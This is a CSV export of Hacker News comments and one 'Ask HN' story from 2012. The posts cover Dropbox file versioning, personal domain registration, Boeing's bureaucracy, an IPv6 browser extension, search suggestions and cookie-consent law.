ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
4024951,comment,4024818,4024818,1,0,sp332,,,"Dropbox does ""version"" files for 30 days. It's not as ""transparent"" as Google's since DB doesn't ""understand"" the contents of the files, but it still keeps versions. And you can upgrade to the PackRat which keeps versions forever. <a href=""https://www.dropbox.com/help/11"" rel=""nofollow"">https://www.dropbox.com/help/11</a>",1337972393
4024950,comment,4023320,4023320,1,0,travelstacker,,,"Gasp! I'm sure your first program is meant to read:<p>#include <stdio.h><p>main()
 {
        printf(""hello, world\n"");
 }<p>;)",1337972347
4024949,comment,4016661,4016858,1,0,13rules,,,"What I learned from reading her blog post (<a href=""http://chicksandpolitics.com/jayleecheapshots/"" rel=""nofollow"">http://chicksandpolitics.com/jayleecheapshots/</a>) -- Candice Schwager is batsh*t insane!!!",1337972334
4024948,story,,,7,21,mikejarema,"Ask HN: Why don't people register personal domains? (eg YourName.com)",,"I own jarema.com (my last name), mikejarema.com (my full name), and a few other variations and TLDs. I take pride in my slick email address (m<i></i>*@jarema.com) and my blog ranking highly in Google for name queries. Based on HN submissions coming from personal domains, I expect that there are others here like me in this respect.<p>When I encourage others to grab a personal domain, especially when their last name .com or even first name .com is unregistered, I find myself all but pleading the case, most times unsuccessfully.<p>I mean for ~$10 annually, and a bit of upfront effort, you can:<p>- move your email from gmail, ymail, hotmail, whatevermail over to your own domain<p>- redirect visitors to your favorite social media profile (FB, twitter, github, dribbble) or in minutes have an about.me page going aggregating it all<p>- alternatively spend some effort building out a blog or portfolio site<p>- avoid worrying about being ""cyber-squatted"" or pranked by a buddy with some initiative<p>- just sit on the domain (defensive registration)<p>The truth of the matter is that a good number of personal domains are available in the .com namespace, and many last name .coms are also up for the taking.<p>However, if & when your name is taken, you're basically SOL.<p>So... I'm curious, why DON'T people register their personal domains?",1337972328
4024946,comment,4023484,4024488,11,0,philwelch,,,"Is it? Knowing people who have worked at Boeing and hearing their stories, and following how much Boeing has struggled in recent years, it's not surprising at all. If there was ever a hidebound company rapidly outliving its usefulness, it was Boeing. And the company is struggling. In airliners, they keep getting beat by Airbus, and time after time comes up second, third, fourth best in defense bids. Once, when they lost a defense bid to Airbus for a tanker, they lobbied to have the military run the selection over again.<p>The entire aerospace industry has been bureaucratic and hidebound for decades. The story of Lockheed's Skunk Works almost belies the point--they were certainly innovative, but even in the 1960's, the only way they could accomplish it was to get all the best engineers and hide from the bureaucrats long enough to just build shit. Up until the first stealth fighter or so (the F-117) it worked, but it doesn't seem to anymore, considering all the problems, delays, crashes, and other mishaps the F-22 has had.<p>(Though, to be fair, the F-22 is a much more difficult undertaking. The F-117 had exactly one thing different from any other airplane from the 70's: it was shaped funny. It also had fly-by-wire because it was aerodynamically poor, but the engineering was far more conservative. The F-22 has lots of innovations at once--stealth, supercruise, improved avionics, the whole works--which entails far much more risk. Also, the 117 was a black project, which means there were a couple smart people in the Pentagon approving it and working as their clients, as opposed to the 22 where there were hundreds of Congressmen and thousands of federal bureaucrats to worry about as clients.)",1337972319
4024945,comment,4023489,4024691,3,0,p1mrx,,,"Here are the primary reasons why IPvFoo is better:<p>- It doesn't send every domain you visit to a third-party server.<p>- It shows whether you're actually using IPv6, not just whether a AAAA record exists.<p>- It shows you all the page elements, not just the top level.<p>- It's Free Software.",1337972315
4024944,comment,4023765,4024844,2,0,forgotusername,,,"Along with Instant, in an ideal world simply by not existing.<p>When searching online I find it vaguely insulting that my presumed default state is one of not already knowing what I'm looking for, and furthermore the question I'm asking is the same question everybody else is asking.<p>In the case of both features I'm treated with a flury of distracting, schizophrenic flashes where previously the UI would behave patiently and consistently while I entered my query.<p>Instant, suggestions, Sets, and the site preview function are begging to be hidden behind a button where you explicitly tell the engine you're confused, and need help figuring out what the vague thing you have in mind really looks like (complete with revolutionary highly visual UI that doesn't resemble a regular search). At least for a user like me.",1337972308
4024943,comment,4023834,4024039,4,0,joelhaasnoot,,,"My girlfriend dropped out of school and ended up at a call center cold calling Chamber of Commerce-listed companies/sole-proprietors selling energy (after being told she'd be calling people about hotel vouchers). She quit after three weeks. The script they were supposed to keep to had bogus lines about tax writeoffs you could get (which would be illegal) and most people weren't at all interested.",1337972298
4024942,comment,4023957,4024509,1,0,mattmanser,,,"They may have severely screwed up the implementation but there's very real and very murky tracking going on through ad networks using cookies and any other way they can think of. This is what the legislation was aimed at, but it went totally OTT.<p>99% of the time, there is no good reason for anyone to know what different sites I visit. Nor does anyone have any reasonable expectation that it is happening to them.<p>Also why an adblock-esque plugin? That really makes no sense to me. This is about a server not being able to set a cookie without explicit consent, I can't see how a plugin would help.",1337972275
4024941,comment,4024255,4024395,1,0,founder_anon,,,"Thank you for your suggested phrasing. I appreciate it; it helped me think about what tone to adopt.",1337972261
